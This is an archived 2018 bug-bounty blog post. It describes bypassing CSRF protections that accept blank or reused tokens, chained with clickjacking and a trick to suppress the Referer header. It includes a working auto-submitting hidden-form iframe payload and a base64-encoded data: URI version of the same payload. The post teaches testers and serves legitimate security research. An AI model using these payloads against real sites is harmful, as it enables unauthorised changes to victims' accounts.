---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-10-29_improper-csrf-token-handling-leads-to-site-wide-csrf-issue-chained-with-clickjac.md
original_filename: 2018-10-29_improper-csrf-token-handling-leads-to-site-wide-csrf-issue-chained-with-clickjac.md
title: Improper CSRF token handling leads to site-wide CSRF issue, chained with clickjacking
  = woot! Multiple sites vulnerable
category: documents
detected_topics:
- clickjacking
- command-injection
- otp
- automation-abuse
- cors
- csrf
tags:
- imported
- documents
- clickjacking
- command-injection
- otp
- automation-abuse
- cors
- csrf
language: en
raw_sha256: 80064357e78bca4b5c093fdf53d580067db06c4d44cdd3dfa6605d8a63853fcd
text_sha256: 912381b18de9725d5dcad35c9720ad04aa37dc2ba0b66963d995ac91cc0e490d
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Improper CSRF token handling leads to site-wide CSRF issue, chained with clickjacking = woot! Multiple sites vulnerable

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-10-29_improper-csrf-token-handling-leads-to-site-wide-csrf-issue-chained-with-clickjac.md
- Source Type: markdown
- Detected Topics: clickjacking, command-injection, otp, automation-abuse, cors, csrf
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `80064357e78bca4b5c093fdf53d580067db06c4d44cdd3dfa6605d8a63853fcd`
- Text SHA256: `912381b18de9725d5dcad35c9720ad04aa37dc2ba0b66963d995ac91cc0e490d`


## Content

---
title: "Improper CSRF token handling leads to site-wide CSRF issue, chained with clickjacking = woot! Multiple sites vulnerable"
url: "https://zseano.medium.com/site-wide-csrf-issue-chained-with-clickjacking-multiple-sites-vulnerable-6201abab0d3e"
authors: ["Zseano (@zseano)"]
bugs: ["CSRF", "Clickjacking"]
publication_date: "2018-10-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5621
scraped_via: "browseros"
---

# Improper CSRF token handling leads to site-wide CSRF issue, chained with clickjacking = woot! Multiple sites vulnerable

Improper CSRF token handling leads to site-wide CSRF issue, chained with clickjacking = woot! Multiple sites vulnerable
Sean (zseano)
Follow
3 min read
·
Oct 29, 2018

401

1

Press enter or click to view image in full size

I recently gave a talk at @_DC151 about some interesting bug and bypasses i’ve found in my time doing bug bounties. In my talk I described an interesting technique for bypassing CSRF protections some sites have with clickjacking. I made a challenge for it over at BugBountyNotes also, but now i’m going to go into more detail around it. (I blogged about something similar back in 2016 affecting XVideos.com if you remember for those following me since day one :D)

Improper CSRF token handling + clickjacking

CSRF tokens are designed to prevent a request coming from evil.com to execute “an action” (such as update email) which affects redacted.com, but what happens if a site isn’t handling it correctly?

Press enter or click to view image in full size

Imagine this is the request:

POST /settings HTTP/1.1
Host: redacted.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://www.redacted.com/settings
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=loggedin

email=example@email.com&name=Example&csrf_token=d9238iedodqw9e9

Looks relatively normal right? It will update our email and name as long as the csrf_token is valid. But what happens if we send a blank token value?

email=example@email.com&name=Example&csrf_token=

Some sites will actually respond back with the change you wanted to do (such as updating your email/name), but with an error: Invalid CSRF token. Please resubmit the request.

Upon submitting the request, the changes will save. You can usually get this error from multiple ways, for example another method is to just simply use your CSRF token. When another user sends the request, the site will see it as valid (it’s yours), but not valid for the user, and therefore reflect the changes you want to make, but with the error. There are other ways depending on the site and how they handle CSRF tokens.

Get Sean (zseano)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So now if the user submits the request it will save their changes. Let’s weaponize it! We can simply use the following code to execute the request in an iframe and we can then clickjack the user:

<iframe src=”” id=”mainsrc” name=”mainsrc”></iframe>
<div style=”display:none”>
<form action=”https://www.bugbountynotes.com/aaa" id=”mainfrm” method=”POST” target=”mainsrc”>
<input type=”text” name=”email” value=”email@example.com”>
<input type=”text” name=”name” value=”Example”>
<input type=”text” name=”csrf_token” value=””>
</form>
</div>

<script>
window.onload = function(e){
document.getElementById(“mainfrm”).submit();
}
</script>

Relatively simple right? A great tool (and really old skool!) to create a clickjacking PoC is “cakeslice.html”, which you can download here: https://www.bugbountynotes.com/cakeslice.html.zip

Simply input the URL and drag across which part of the website you want to iframe. Using # to move down the page may come in handy since you can’t scroll. (If you know of a better tool, tweet me @zseano!). Easy! :)

But they have X-FRAME-OPTIONS header in response :(

Damn.. no clickjacking. No problem! ;) This can sometimes be bypassed in multiple ways again (depending on the framework it’s built with.). You will be surprised at how many sites rely on the Referer header value for setting the X-FRAME-OPTIONS header.

In some cases setting the Referer to the root domain will cause X-FRAME-OPTIONS to not be set, as well as setting NO referer header. How can you set a blank referer? Iframe the above form in another iframe using data:

<iframe src=”data:text/html;base64,PGlmcmFtZSBzcmM9IiIgaWQ9Im1haW5zcmMiIG5hbWU9Im1haW5zcmMiPjwvaWZyYW1lPgo8ZGl2IHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8Zm9ybSBhY3Rpb249Imh0dHBzOi8vd3d3LmJ1Z2JvdW50eW5vdGVzLmNvbS9hYWEiIGlkPSJtYWluZnJtIiBtZXRob2Q9IlBPU1QiIHRhcmdldD0ibWFpbnNyYyI+CjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJlbWFpbCIgdmFsdWU9ImVtYWlsQGV4YW1wbGUuY29tIj4KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9Im5hbWUiIHZhbHVlPSJFeGFtcGxlIj4KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNzcmZfdG9rZW4iIHZhbHVlPSIiPgo8L2Zvcm0+CjwvZGl2Pgo8c2NyaXB0Pgp3aW5kb3cub25sb2FkID0gZnVuY3Rpb24oZSl7wqAKwqBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibWFpbmZybSIpLnN1Ym1pdCgpOwp9Cjwvc2NyaXB0Pg==”></iframe>

Go ahead and test it, you’ll see not only is there no Referer header, but the origin is also set to “null”, which can lead onto even more issues with how they handle CORS headers.

@WPalant also reminded me you can actually set it using HTML tags:

<meta name="referrer" content="origin">

More info: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy

Multiple sites vulnerable

I’m unsure if this is a framework issue or just luck, but I found multiple sites with bugbounties to be vulnerable to both these methods. If you test further and find anything interesting be sure to let me know! :)

Make sure to always test how a site is handling the Referer and Origin header when making requests (especially with logging in.. perhaps they rely on that to redirect to? :D)

-zseano
